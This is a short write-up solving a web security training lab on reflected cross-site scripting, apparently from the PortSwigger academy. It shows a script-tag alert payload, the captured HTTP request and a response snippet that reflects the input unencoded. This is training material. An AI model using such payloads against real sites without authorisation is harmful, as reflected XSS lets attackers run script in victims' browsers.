The following is a solution to "Lab: Reflected XSS into HTML context with nothing encoded".

In the UI of the lab, enter the following payload into the search bar and click Search:
`<script>alert("howdy");</script>`

This step is demonstrated in the screenshot below:
![A screenshot of the search bar with the alert("howdy"); payload as the search term](/docs/assets/alert() poc 1.png)

As a result, an alert box appears in the UI, with the text from the alert() payload. This is demonstrated in the screenshot below:
![A screenshot of the alert box with the message "howdy"](/docs/assets/alert() poc 2.png)

The HTTP request associated with this action appears below, as pulled from the HTTP history section of the Proxy tab in Burp Suite.

~~~
GET /?search=%3Cscript%3Ealert%28%22howdy%22%29%3B%3C%2Fscript%3E HTTP/2
Host: 0ade007003023308825a84e400020013.web-security-academy.net
Cookie: [redacted]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0ade007003023308825a84e400020013.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers


~~~

The following is a snippet of the HTTP response to the above request.

~~~
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4876

<!DOCTYPE html>
<html>
...
<h1>0 search results for '<script>alert("howdy");</script>'</h1>
...
~~~

This shows that the application reflected the user input inside of the response.